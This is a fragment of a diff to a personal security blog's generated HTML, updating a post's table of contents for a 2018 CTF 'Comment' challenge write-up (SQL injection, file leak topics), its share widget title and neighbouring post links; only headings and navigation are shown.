toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01过程步骤"><span class="toc-text">0x01过程步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02考点总结"><span class="toc-text">0x02考点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件泄露"><span class="toc-text">1.文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-sql二次注入"><span class="toc-text">2.sql二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-sql文件读取"><span class="toc-text">3.sql文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-linux-命令细节"><span class="toc-text">4.linux 命令细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-hexwin-分析hex数据"><span class="toc-text">5.hexwin 分析hex数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00参考文献"><span class="toc-text">0x00参考文献</span></a></li></ol>
         
     </div>
     <style>
@@ -465,7 +456,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"学习pwn小记(1)　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"网鼎杯 2018-Comment  复现笔记　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -485,15 +476,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/" title="上一篇: 对linux 命令执行的总结">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="下一篇: 关于SQL注入小记">
+            <a href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/" title="下一篇: 关于sql注入bypass总结">
                 <i class="fa fa-angle-right"></i>
             </a>
         
